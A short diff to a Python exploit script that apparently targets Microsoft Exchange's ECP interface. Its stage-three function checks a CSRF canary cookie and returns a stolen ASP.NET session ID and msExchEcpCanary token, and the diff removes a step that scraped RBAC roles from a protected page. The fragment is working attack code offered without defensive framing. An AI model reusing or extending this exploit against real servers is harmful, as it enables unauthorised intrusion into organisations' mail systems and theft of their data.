@@ -177,15 +177,7 @@ def exploit_stage3(target, email, user_agent, random_name, sid, FQDN):
     # If the returned HTTP status code is NOT 200
     if stage3.status_code != 200:
         print("[Stage 3] CSRF Canary-cookie check failed!")
-
-    # Fetch rBacRoles and split them
-    rbacRole = \
-    stage3.content.decode('utf8').strip().split("RBAC roles:</span> <span class='diagTxt'>")[1].split("</span>")[
-        0]
-
-    print(
-        "[Stage 3] Successfully performed session and csrf health check by fetching about.aspx (protected page)")
-
+   
     # Return the ASP.NET SessionID and msExchEcpCanary
     return sess_id, msExchEcpCanary
 
